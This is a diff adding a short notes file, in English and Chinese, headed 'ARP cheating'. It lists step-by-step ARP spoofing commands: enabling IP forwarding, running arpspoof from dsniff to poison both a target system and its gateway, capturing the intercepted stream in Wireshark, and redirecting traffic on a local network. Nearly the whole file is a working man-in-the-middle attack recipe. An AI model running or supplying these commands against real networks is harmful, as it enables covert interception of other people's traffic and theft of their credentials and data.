@@ -1,0 +1,17 @@
+ARP cheating
+
+1. URL 流量操纵
+1.1 turn on ip forward
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	OR sysctl
+1.2 attack target system
+	arpspoof -i eth0 -t TARGET_SYSTEM GATEWAY
+1.3 attack gateway
+	arpspoof -i eth0 -t GATEWAY TARGET_SYSTEM
+TOOL:dsniff
+1.4 catch stream with wireshark
+
+2. 端口重定向
+2.1 turn on ip forward
+2.2 注入流量到默认网络
+	arpspoof -i eth0 192.168.6.1
